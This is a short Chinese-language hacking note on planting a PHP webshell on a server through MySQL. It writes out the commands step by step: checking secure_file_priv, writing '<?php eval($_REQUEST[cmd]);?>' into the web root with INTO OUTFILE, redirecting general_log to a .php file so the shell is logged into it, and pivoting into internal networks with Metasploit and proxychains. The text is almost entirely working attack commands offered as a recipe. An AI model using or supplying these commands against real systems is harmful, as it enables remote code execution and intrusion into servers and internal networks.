(1)into outfile
Mysql新特性secure_file_priv会对读写文件产生影响，该参数用来限制导入导出。
secure_file_priv=null 限制mysqld不允许导入/导出。
secure_file_priv=/tmp/ 限制mysqld得导入/导出只能发生在/tmp/目录下。
secure_file_priv 没有具体值 不对mysqld的导入/导出做限制。

show global variables like '%secure%';

当secure_file_priv不为null时，理论上可以向数据库所在服务器导入webshell。
SELECT @@basedir //查询物理路径
select '<?php eval($_REQUEST[cmd]);?>' into outfile '<物理路径>/cmd.php' //在物理路径下新建getshell文件cmd

(2)general_log
主要操作逻辑是，将日志文件设定为php类型，并通过操作将getshell木马写入日志文件中。
//查询 日志文件记录状态general_log 和 日志文件路径general_log_file
SHOW GLOBAL VARIABLES LIKE '%general%'; 
//开启日志记录
SET GLOBAL general_log = 'ON'; 
//设置日志文件为C:/phpStudy/WWW/cmd.php （注意这里的斜杠不能弄反）
SET GLOBAL general_log_file = 'C:/phpStudy/WWW/cmd.php'; 
//查询一句话木马，使其以php代码的形式完整写入php日志文件
//注意这里一句话木马要用''括起来，否则php代码中的;会截断该查询命令，导致写入日志文件的代码不完整
SELECT '<?php eval($_REQUEST[cmd]);?>';

使用msf+proxychain

通过proxychain所有的流量都转发至本地1080端口，本地1080端口由msf起的socks监听，又存在route连接内网，所以通过proxychain所有的流量都可以到达内网。（让msf能够到达目标机器内网）
